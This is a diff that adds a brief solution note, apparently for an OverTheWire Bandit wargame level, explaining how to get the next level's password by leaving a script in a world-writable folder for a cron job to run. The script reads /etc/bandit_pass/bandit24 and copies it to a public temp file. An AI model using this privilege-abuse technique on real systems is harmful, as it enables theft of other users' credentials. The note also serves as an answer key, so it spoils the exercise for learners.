@@ -1,0 +1,5 @@
+1- make a temp folder
+2- use chmod 777 to make it public
+3- create password.sh inside it:
+cat /etc/bandit_pass/bandit24 > /tmp/alireza/password.txt
+4-check the password.txt file after a minute
